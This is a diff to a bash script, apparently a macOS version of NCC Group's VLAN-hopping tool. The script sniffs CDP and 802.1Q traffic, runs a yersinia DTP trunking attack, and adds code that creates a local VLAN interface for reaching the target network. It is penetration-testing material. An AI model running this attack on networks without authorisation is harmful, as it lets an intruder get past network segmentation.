@@ -24,13 +24,9 @@
 ######################################################################################
 
 # User configuration Settings
-TAGSEC="90" #change this value for the number of seconds to sniff for 802.1Q tagged packets
-CDPSEC="90" # change this value for the number of seconds to sniff for CDP packets once verified CDP is on
+TAGSEC="60" #change this value for the number of seconds to sniff for 802.1Q tagged packets
+CDPSEC="60" # change this value for the number of seconds to sniff for CDP packets once verified CDP is on
 DTPWAIT="20" # amount of time to wait for DTP attack via yersinia to trigger
-
-# ethtool not present on OS X. Keep disabled !!
-NICCHECK="off" # if you are confident your built in NIC will work within VMware then set to off. i.e you have made reg change for Intel card.
-
 
 # Variables needed throughout execution, do not touch
 MANDOM=""
@@ -53,7 +49,6 @@ echo "***   Auto enumerates VLANs and device discovery ***"
 echo -e "\033[0;32m########################################################\033[0m"
 echo ""
 echo "For usage information refer to the Wiki"
-echo ""
 echo "https://github.com/nccgroup/vlan-hopping/wiki"
 echo ""
 
@@ -87,9 +82,7 @@ fi
 which screen >/dev/null
 if [ $? -eq 1 ]
 	then
-		echo ""
-		echo -e "\033[01;31m[!]\033[0m Unable to find the required screen program, install and try again."
-		echo ""
+		echo -e "\n\033[01;31m[!]\033[0m Unable to find the required screen program, install and try again.\n"
 		exit 1
 fi
 
@@ -97,22 +90,19 @@ fi
 which arp-scan >/dev/null
 if [ $? -eq 1 ]
 	then
-		echo -e "\033[01;31m[!]\033[0m Unable to find the required arp-scan program, install at least version 1.8 and try again. Download from www.nta-monitor.com."
-		echo ""
+		echo -e "\033[01;31m[!]\033[0m Unable to find the required arp-scan program, install at least version 1.8 and try again. Download from www.nta-monitor.com.\n"
 		exit 1
 else
 	compare_arpscan=$(echo "$ARPVER < 1.8" | bc)
 	if [ $compare_arpscan -eq 1 ] 
 		then
-			echo ""
-			echo -e "\033[01;31m[!]\033[0m Unable to find version 1.8 of arp-scan, 1.8 is required for VLAN tagging. Install at least version 1.8 and try again. Download from www.nta-monitor.com."
+			echo -e "\n\033[01;31m[!]\033[0m Unable to find version 1.8 of arp-scan, 1.8 is required for VLAN tagging. Install at least version 1.8 and try again. Download from www.nta-monitor.com."
 			exit 1
 	fi
 fi
 
-echo ""
-echo -e "\033[01;32m[-]\033[0m The following Interfaces are available"
-echo ""
+
+echo -e "\n\033[01;32m[-]\033[0m The following interfaces are available\n"
 ifconfig | sed -n -e '/en[0-9]/,/status/ p'
 #ifconfig | grep -o "en.*" |cut -d " " -f1
 echo ""
@@ -130,46 +120,10 @@ if [ $? = 1 ]
 		exit 1
 fi
 
-# check for Vmware and non USB ethernet card.
-if [ "$NICCHECK" = "on" ]
-then
-dmidecode | grep -i "vmware" >/dev/null
-if [ $? = 0 ]
-	then
-		if [ "$INT" = "eth0" ]
-			then
-				echo ""
-				echo -e "\033[01;33m[!]\033[0m Warning it seems you are running within VMware using the built in network interface "$INT". "
-				echo ""
-				echo "Some built in network cards do not work properly within VMware and VLAN hopping may fail. Ideally use a USB ethernet card, or boot natively into Linux."
-				echo ""
-				echo -e "Script will continue, but see https://github.com/nccgroup/vlan-hopping/wiki for more info relating to VMware and VLAN Hopping"
-				echo ""
-				sleep 3
-				NICDRV=$(ethtool -i $INT | grep -i "driver" | cut -d ":" -f 2 | sed 's/^[ \t]*//;s/[ \t]*$//')
-				modinfo "$NICDRV" |grep -i "intel" >/dev/null
-				if [ $? = 0 ]
-					then
-						echo ""
-						echo -e "\033[01;31m[!]\033[0m Warning it also seems that "$INT" is using Intel drivers."
-						echo ""
-						echo "It is likely the VLAN hopping with fail with Intel Windows drivers and VMware unless the '"MonitorMode"' registry change has been made."
-						echo ""
-						echo "see https://github.com/nccgroup/vlan-hopping/wiki for how to apply the Intel fix."
-						echo ""
-						echo "If you have already made the reg change, then set NICCHECK to "off" in the script header to prevent the check running again"
-						echo ""
-						echo "Press Enter to continue if you have made the registry change, or CTRL-C to quit."
-						echo ""
-						read ENTERKEY
-				fi
-		fi
-fi
-fi
 echo ""
 echo -e "\033[01;32m[-]\033[0m Now Sniffing CDP Packets on $INT - Please wait for "$CDPSEC" seconds."
 echo ""
-OUTPUT="`tshark -a duration:$CDPSEC -i $INT -R \"cdp\" -V 2>&1 | sort --unique`"
+OUTPUT="`tshark -a duration:$CDPSEC -i $INT -Y \"cdp\" -V 2>&1 | sort --unique`"
 printf -- "${OUTPUT}\n" | while read line
 do
 	case "${line}" in
@@ -205,7 +159,8 @@ do
 				echo -e "\033[1;32m----------------------------------------------------------\033[0m"
 				echo -e "\033[01;32m[+]\033[0m The following Management domains were found"
 				echo -e "\033[1;32m----------------------------------------------------------\033[0m"
-				echo -e "\033[0;32m$MANDOM\033[0m"
+				#echo -e "\033[0;32m$MANDOM\033[0m"
+				echo -e "\033[0;32m${line}\033[0m"
 				echo ""			
 			fi
 			;;
@@ -284,7 +239,8 @@ fi
 echo ""
 echo -e "\033[01;32m[-]\033[0m Now Running DTP Attack on interface $INT, waiting "$DTPWAIT" seconds to trigger."
 echo ""
-screen -d -m -S yersina_dtp yersinia dtp -attack 1 -interface $INT
+echo "This might not work. try running 'sudo yersinia dtp -attack 1 -interface $INT' in a different window."
+screen -d -m -S yersina_dtp sudo yersinia dtp -attack 1 -interface $INT
 sleep $DTPWAIT
 #clear
 
@@ -292,7 +248,7 @@ echo ""
 echo -e "\033[01;32m[-]\033[0m Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for "$TAGSEC" seconds."
 echo ""
 
-VLANIDS=$(tshark -a duration:$TAGSEC -i $INT -R "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique)
+VLANIDS=$(tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique)
 
 if [ -z "$VLANIDS" ]
 	then
@@ -343,7 +299,7 @@ echo -e "\033[1;31m-------------------------------------------------------------
 echo -e "\033[01;31m[?]\033[0m Do you want to create a new interface in the discoved VLAN or Exit?"
 echo -e "\033[1;31m-----------------------------------------------------------------------------------------\033[0m"
 echo ""
-echo " 1. Create a new local VLAN Interface for attacking the target - WILL NOT WORK ON OS X. MANUAL SETUP REQUIRED"
+echo " 1. Create a new local VLAN Interface for attacking the target"
 echo ""
 echo " 2. Exit script - this will kill all processes and stop the DTP attack"
 echo ""
@@ -351,18 +307,40 @@ echo -e "\033[1;31m-------------------------------------------------------------
 echo ""
 read EXITMENU
 	
-	if [ "$EXITMENU" = "1" ]
-		then
-			echo -e "\033[1;31m-----------------------------------------------\033[0m"
-			echo -e "\033[01;31m[?]\033[0m NOT SUPPORTED. Configure manually"
-			echo -e "\033[1;31m-----------------------------------------------\033[0m"
+	if [ "$EXITMENU" = "1" ]; then
+			echo -e "\033[1;31m-----------------------------------------------\033[00m"
+			echo -e "\033[01;31m[?]\033[00m Enter the VLAN ID to Create i.e 100"
+			echo -e "\033[1;31m-----------------------------------------------\033[00m"
 			read VID
+			echo ""
+			echo -e "\033[1;31m-------------------------------------------------------------------------------------------------------------\033[00m"
+			echo -e "\033[01;31m[?]\033[00m Enter the IP address you wish to assign to the new VLAN interface $VID i.e 192.168.1.100/24"
+			echo -e "\033[1;31m-------------------------------------------------------------------------------------------------------------\033[00m"
+			read VIP
+
+			networksetup -listdevicesthatsupportVLAN | grep $INT >/dev/null
+			if [[ $? -ne 0 ]]; then
+				echo -e "\n\033[01;31m[!]\033[0m The network interface you are using does not support VLAN tagging.\n"
+				exit 1
+			fi
+			networksetup -listVLANs | grep "There are no VLANs currently configured on this system." >/dev/null
+			if [ $? -eq 1 ]; then
+				echo -e "\n\033[01;31m[!]\033[0m You already have some VLAN configured. Do the IP configuration yourself\n"
+				ifconfig | sed -n -e '/vlan[0-9]/,/status/ p'
+				echo -e "\nExiting...\n"
+				exit 1
+			fi
+			networksetup -createVLAN vlan-frogger $INT $VID			
+			ifconfig vlan0 up
+			ifconfig vlan0 $VIP
+			echo -e "\n\033[01;32m[+]\033[00m The following interface is now configured locally\n"
+			echo -e "\033[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[00m"
+			echo -e "\033[01;32m[+]\033[00m Interface \033[1;32mvlan0\033[00m with IP Address \033[1;32m$VIP\033[00m"
+			echo -e "\033[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[00m\n"
 				
-	elif [ "$EXITMENU" = "2" ]
-	then
+	elif [ "$EXITMENU" = "2" ]; then
 		ps -ef | grep "[Yy]ersinia dtp" >/dev/null
-			if [ $? = 0 ]
-				then
+			if [ $? = 0 ]; then
 					killall yersinia
 					echo ""
 					echo -e "\033[01;32m[+]\033[0m DTP attack has been stopped."
@@ -373,4 +351,3 @@ read EXITMENU
 					exit 1
 			fi
 fi
-#END
